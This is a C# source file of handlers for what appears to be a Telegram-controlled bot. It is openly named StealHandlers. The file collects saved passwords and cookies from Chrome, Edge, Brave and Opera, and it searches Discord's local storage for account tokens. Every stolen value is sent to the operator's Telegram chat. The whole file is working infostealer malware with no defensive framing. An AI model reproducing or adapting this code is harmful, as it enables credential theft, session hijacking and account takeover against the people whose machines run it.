using BotController1.Core;
using BotController1.Telegram;

namespace BotController1.Handlers;

public class StealHandlers : HandlerBase
{
    public StealHandlers(TelegramClient tg) : base(tg)
    {
    }

    public void Passwords(TgMessage message)
    {
        if (!Authorize(message))
            return;
        var browser = BrowserFrom(message.Text, "passwords");
        Tg.SendMessage(message.ChatId, $"🔍 Collecting {browser} passwords...");
        try
        {
            var passwords = browser switch
            {
                "chrome" => BrowserData.ChromePasswords(),
                "edge" => BrowserData.EdgePasswords(),
                "brave" => BrowserData.BravePasswords(),
                "opera" => BrowserData.OperaPasswords(),
                _ => new List<BrowserData.Credential>(),
            };

            if (passwords.Count > 0)
            {
                var msg = $"🔑 Found {passwords.Count} passwords from {Title(browser)}:\n\n";
                for (var i = 0; i < passwords.Count; i++)
                {
                    var entry = passwords[i];
                    var entryText = $"Entry {i + 1}:\n";
                    entryText += $"URL: {entry.Url ?? "None"}\n";
                    entryText += $"Username: {entry.Username ?? "None"}\n";
                    entryText += $"Password: {entry.Password ?? "None"}";
                    if ((msg + entryText).Length > 4000)
                    {
                        Tg.SendMessage(message.ChatId, msg);
                        msg = entryText;
                    }
                    else
                    {
                        msg += entryText + "\n";
                    }
                }
                if (msg.Length > 0)
                    Tg.SendMessage(message.ChatId, msg);
            }
            else
            {
                Tg.SendMessage(message.ChatId, $"❌ No passwords found in {Title(browser)}");
            }
        }
        catch (Exception e)
        {
            Tg.SendMessage(message.ChatId,
                $"❌ Error retrieving {Title(browser)} passwords: {e.Message}");
        }
    }

    public void Cookies(TgMessage message)
    {
        if (!Authorize(message))
            return;
        var browser = BrowserFrom(message.Text, "cookies");
        Tg.SendMessage(message.ChatId, $"🔍 Collecting {browser} cookies...");
        try
        {
            var cookies = browser switch
            {
                "chrome" => BrowserData.ChromeCookies(),
                "edge" => BrowserData.EdgeCookies(),
                "brave" => BrowserData.BraveCookies(),
                "opera" => BrowserData.OperaCookies(),
                _ => new List<BrowserData.CookieData>(),
            };

            if (cookies.Count > 0)
            {
                var msg = $"🍪 Found {cookies.Count} cookies from {Title(browser)}:\n\n";
                for (var i = 0; i < cookies.Count; i++)
                {
                    var c = cookies[i];
                    var cookieText = $"Cookie {i + 1}:\n";
                    cookieText += $"Domain: {c.Domain}\n";
                    cookieText += $"Name: {c.Name}\n";
                    cookieText += $"Value: {c.Value}\n";
                    cookieText += $"Secure: {c.Secure}";
                    if ((msg + cookieText).Length > 4000)
                    {
                        Tg.SendMessage(message.ChatId, msg);
                        msg = cookieText;
                    }
                    else
                    {
                        msg += cookieText + "\n";
                    }
                }
                if (msg.Length > 0)
                    Tg.SendMessage(message.ChatId, msg);
            }
            else
            {
                Tg.SendMessage(message.ChatId, $"❌ No cookies found in {Title(browser)}");
            }
        }
        catch (Exception e)
        {
            Tg.SendMessage(message.ChatId,
                $"❌ Error retrieving {Title(browser)} cookies: {e.Message}");
        }
    }

    public void Discord(TgMessage message)
    {
        if (!Authorize(message))
            return;
        Tg.SendMessage(message.ChatId, "🔍 Searching for Discord tokens...");
        try
        {
            var tokens = new List<string>();
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var discordPaths = new[]
            {
                Path.Combine(appData, "Discord"),
                Path.Combine(appData, "discordcanary"),
                Path.Combine(appData, "discordptb"),
            };

            foreach (var discordPath in discordPaths)
            {
                if (!Directory.Exists(discordPath))
                    continue;
                var storagePath = Path.Combine(discordPath, "Local Storage", "leveldb");
                if (!Directory.Exists(storagePath))
                    continue;

                foreach (var fileName in Directory.GetFiles(storagePath))
                {
                    var name = Path.GetFileName(fileName);
                    if (!name.EndsWith(".ldb") && !name.EndsWith(".log"))
                        continue;
                    try
                    {
                        var content = File.ReadAllText(fileName);
                        var possible = new List<string>();
                        foreach (var line in content.Split("\\n"))
                        {
                            foreach (var token in line.Split('"'))
                            {
                                if (token.Length >= 59 && token.All(char.IsLetterOrDigit))
                                    possible.Add(token);
                            }
                        }
                        tokens.AddRange(possible);
                    }
                    catch
                    {
                    }
                }
            }

            if (tokens.Count > 0)
            {
                var msg = "💎 Found Discord tokens:\n\n";
                for (var i = 0; i < tokens.Count; i++)
                    msg += $"{i + 1}. `{tokens[i]}`\n";
                Tg.SendMessage(message.ChatId, msg, "Markdown");
            }
            else
            {
                Tg.SendMessage(message.ChatId, "❌ No Discord tokens found");
            }
        }
        catch (Exception e)
        {
            Tg.SendMessage(message.ChatId,
                $"❌ Error retrieving Discord tokens: {e.Message}");
        }
    }
}
